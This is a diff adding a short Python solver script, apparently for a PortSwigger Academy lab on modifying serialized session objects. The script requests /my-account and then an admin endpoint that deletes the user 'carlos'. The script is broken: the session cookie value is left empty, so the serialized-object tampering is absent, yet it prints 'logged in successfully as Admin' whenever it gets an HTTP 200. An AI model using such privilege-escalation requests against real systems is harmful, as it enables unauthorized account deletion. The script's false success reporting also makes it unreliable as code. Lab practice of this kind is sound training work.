@@ -1,0 +1,28 @@
+import requests
+import argparse
+
+parser = argparse.ArgumentParser(description="Exploit serialized object vulnerability")
+parser.add_argument("-u", "--url", required=True, help="LAB URL (e.g., https://example.com)")
+args = parser.parse_args()
+
+print("PortSwigger Labs: Modifying serialized objects")
+print("By Shimon Zada")
+
+LAB_URL = args.url.rstrip("/")
+session_id = ""
+
+cookie_header = {"Cookie": f"session={session_id}"}
+
+try:
+    exploit1 = requests.get(f"{LAB_URL}/my-account?id=wiener", headers=cookie_header)
+    if exploit1.status_code == 200:
+        print("logged in successfully as Admin")
+        print("Triggering the final exploit")
+        exploit2 = requests.get(f"{LAB_URL}/admin/delete?username=carlos", headers=cookie_header)
+        if "solved" in exploit2.text:
+            print("Lab Solved!")
+    else:
+        print("Failed")
+except Exception as e:
+    print(f"An error occurred: {e}")
+
